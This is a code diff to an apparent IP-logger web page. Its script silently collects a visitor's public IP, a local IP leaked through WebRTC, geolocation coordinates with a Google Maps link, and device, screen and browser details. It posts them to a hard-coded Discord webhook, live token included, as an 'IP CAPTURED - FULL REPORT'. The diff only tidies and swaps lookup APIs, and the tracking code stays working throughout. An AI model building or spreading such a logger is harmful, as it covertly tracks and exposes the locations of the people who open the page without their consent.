@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -20,7 +21,6 @@
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
         
-        // Device detection
         function detectDevice() {
             const ua = navigator.userAgent.toLowerCase();
             let deviceType = 'Desktop';
@@ -60,7 +60,6 @@
             return { deviceType, os, browser, userAgent: navigator.userAgent };
         }
         
-        // Local IP detection
         async function getLocalIP() {
             return new Promise((resolve) => {
                 const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
@@ -107,10 +106,8 @@
             });
         }
         
-        // Get accurate location with multiple API fallbacks
         async function getAccurateLocation(ip) {
             const apis = [
-                // Try multiple APIs for best accuracy
                 async () => {
                     try {
                         const res = await fetch(`https://ipapi.co/${ip}/json/`);
@@ -123,49 +120,48 @@
                             isp: data.org || 'Unknown',
                             zip: data.postal || 'Unknown',
                             timezone: data.timezone || 'Unknown',
-                            lat: data.latitude || 'Unknown',
-                            lon: data.longitude || 'Unknown',
+                            lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : 'Unknown',
+                            lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : 'Unknown',
                             source: 'ipapi.co'
                         };
                     } catch (e) { throw e; }
                 },
                 async () => {
                     try {
-                        const res = await fetch(`https://ipwhois.app/json/${ip}`);
+                        const res = await fetch(`https://ipwho.is/${ip}`);
                         const data = await res.json();
                         return {
                             city: data.city || 'Unknown',
                             region: data.region || 'Unknown',
                             country: data.country || 'Unknown',
-                            isp: data.isp || 'Unknown',
+                            isp: data.connection.isp || 'Unknown',
                             zip: data.postal || 'Unknown',
-                            timezone: data.timezone || 'Unknown',
-                            lat: data.latitude || 'Unknown',
-                            lon: data.longitude || 'Unknown',
-                            source: 'ipwhois.app'
+                            timezone: data.timezone.id || 'Unknown',
+                            lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : 'Unknown',
+                            lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : 'Unknown',
+                            source: 'ipwho.is'
                         };
                     } catch (e) { throw e; }
                 },
                 async () => {
                     try {
-                        const res = await fetch(`https://freegeoip.app/json/${ip}`);
+                        const res = await fetch(`https://ipapi.co/${ip}/json/`);
                         const data = await res.json();
                         return {
                             city: data.city || 'Unknown',
-                            region: data.region_name || data.region_code || 'Unknown',
-                            country: data.country_name || data.country_code || 'Unknown',
-                            isp: data.isp || 'Unknown',
-                            zip: data.zip_code || 'Unknown',
-                            timezone: data.time_zone || 'Unknown',
-                            lat: data.latitude || 'Unknown',
-                            lon: data.longitude || 'Unknown',
-                            source: 'freegeoip.app'
+                            region: data.region || 'Unknown',
+                            country: data.country_name || 'Unknown',
+                            isp: data.org || 'Unknown',
+                            zip: data.postal || 'Unknown',
+                            timezone: data.timezone || 'Unknown',
+                            lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : 'Unknown',
+                            lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : 'Unknown',
+                            source: 'ipapi.co v2'
                         };
                     } catch (e) { throw e; }
                 }
             ];
             
-            // Try each API in order until one works
             for (const api of apis) {
                 try {
                     const result = await api();
@@ -173,7 +169,7 @@
                         return result;
                     }
                 } catch (e) {
-                    console.log(`API failed: ${e.message}`);
+                    console.log(`API failed`);
                 }
             }
             
@@ -199,42 +195,32 @@
             status.style.display = 'none';
             
             try {
-                // Get public IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const publicIP = ipData.ip;
                 
-                // Get local IP
                 const localIP = await getLocalIP();
                 
-                // Get accurate location
                 const location = await getAccurateLocation(publicIP);
                 
-                // Detect device
                 const deviceInfo = detectDevice();
                 
-                // Get screen info
                 const screenWidth = screen.width;
                 const screenHeight = screen.height;
                 const screenDepth = screen.colorDepth;
                 const pixelRatio = window.devicePixelRatio || 1;
                 
-                // Get browser info
                 const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
                 const doNotTrack = navigator.doNotTrack || navigator.msDoNotTrack || 'Unknown';
                 const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
                 const referrer = document.referrer || 'Direct visit';
                 const language = navigator.language || 'Unknown';
-                const javaEnabled = navigator.javaEnabled ? 'Yes' : 'No';
-                const pdfEnabled = navigator.pdfViewerEnabled ? 'Yes' : 'No';
                 
-                // Create Google Maps link
-                let mapsLink = 'No coordinates';
+                let mapsLink = 'No coordinates available';
                 if (location.lat !== 'Unknown' && location.lon !== 'Unknown') {
-                    mapsLink = `[Google Maps](https://www.google.com/maps?q=${location.lat},${location.lon}&z=15) | [OpenStreetMap](https://www.openstreetmap.org/?mlat=${location.lat}&mlon=${location.lon}&zoom=15)`;
+                    mapsLink = `https://www.google.com/maps?q=${location.lat},${location.lon}&z=15`;
                 }
                 
-                // Get time
                 const now = new Date();
                 const dateStr = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear()}`;
                 let hours = now.getHours();
@@ -243,49 +229,48 @@
                 hours = hours ? hours : 12;
                 const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
                 
-                // Create Discord embed with ALL information
                 const embed = {
                     title: "IP CAPTURED - FULL REPORT",
-                    color: 0xFF0000, // Red
+                    color: 16711680,
                     fields: [
                         {
-                            name: "🌐 NETWORK INFORMATION",
-                            value: `**Public IP:** \`${publicIP}\`\n**Local IP:** \`${localIP}\`\n**ISP:** ${location.isp}\n**VPN/Proxy:** Checking...`,
+                            name: "NETWORK INFORMATION",
+                            value: `Public IP: \`${publicIP}\`\nLocal IP: \`${localIP}\`\nISP: ${location.isp}`,
                             inline: true
                         },
                         {
-                            name: "📍 GEO-LOCATION",
-                            value: `**City:** ${location.city}\n**Region:** ${location.region}\n**Country:** ${location.country}\n**ZIP:** ${location.zip}\n**Timezone:** ${location.timezone}`,
+                            name: "GEO-LOCATION",
+                            value: `City: ${location.city}\nRegion: ${location.region}\nCountry: ${location.country}\nZIP: ${location.zip}\nTimezone: ${location.timezone}`,
                             inline: true
                         },
                         {
-                            name: "🗺️ COORDINATES & MAPS",
-                            value: `**Latitude:** ${location.lat}\n**Longitude:** ${location.lon}\n**Accuracy Source:** ${location.source}\n**View on Maps:**\n${mapsLink}`,
+                            name: "COORDINATES",
+                            value: `Latitude: ${location.lat}\nLongitude: ${location.lon}\nAccuracy Source: ${location.source}\nGoogle Maps: ${mapsLink}`,
                             inline: true
                         },
                         {
-                            name: "💻 DEVICE DETAILS",
-                            value: `**Device Type:** ${deviceInfo.deviceType}\n**Operating System:** ${deviceInfo.os}\n**Browser:** ${deviceInfo.browser}\n**Platform:** ${navigator.platform}`,
+                            name: "DEVICE DETAILS",
+                            value: `Device Type: ${deviceInfo.deviceType}\nOperating System: ${deviceInfo.os}\nBrowser: ${deviceInfo.browser}\nPlatform: ${navigator.platform}`,
                             inline: true
                         },
                         {
-                            name: "🖥️ DISPLAY & SYSTEM",
-                            value: `**Screen:** ${screenWidth}x${screenHeight}\n**Pixel Ratio:** ${pixelRatio}\n**Color Depth:** ${screenDepth}bit\n**Language:** ${language}\n**CPU Cores:** ${navigator.hardwareConcurrency || 'Unknown'}`,
+                            name: "DISPLAY & SYSTEM",
+                            value: `Screen: ${screenWidth}x${screenHeight}\nPixel Ratio: ${pixelRatio}\nColor Depth: ${screenDepth}bit\nLanguage: ${language}`,
                             inline: true
                         },
                         {
-                            name: "🔧 BROWSER SETTINGS",
-                            value: `**Cookies:** ${cookiesEnabled}\n**Do Not Track:** ${doNotTrack}\n**Java:** ${javaEnabled}\n**PDF Viewer:** ${pdfEnabled}\n**Online:** ${onlineStatus}`,
+                            name: "BROWSER SETTINGS",
+                            value: `Cookies: ${cookiesEnabled}\nDo Not Track: ${doNotTrack}\nOnline: ${onlineStatus}\nReferrer: ${referrer.substring(0, 40)}${referrer.length > 40 ? '...' : ''}`,
                             inline: true
                         },
                         {
-                            name: "📊 SESSION INFORMATION",
-                            value: `**Date:** ${dateStr}\n**Time:** ${timeStr}\n**Referrer:** ${referrer.substring(0, 50)}${referrer.length > 50 ? '...' : ''}\n**Page URL:** ${window.location.href}\n**User Agent Hash:** \`${btoa(deviceInfo.userAgent.substring(0, 30)).slice(0, 20)}...\``,
+                            name: "TIME & SESSION",
+                            value: `Date: ${dateStr}\nTime: ${timeStr}\nPage URL: ${window.location.href}\nFull User Agent: \`\`\`${deviceInfo.userAgent.substring(0, 300)}\`\`\``,
                             inline: false
                         }
                     ],
                     footer: {
-                        text: `IP Logger • Data Source: ${location.source} • Click logged`
+                        text: `IP Logger • Location source: ${location.source}`
                     },
                     timestamp: new Date().toISOString()
                 };
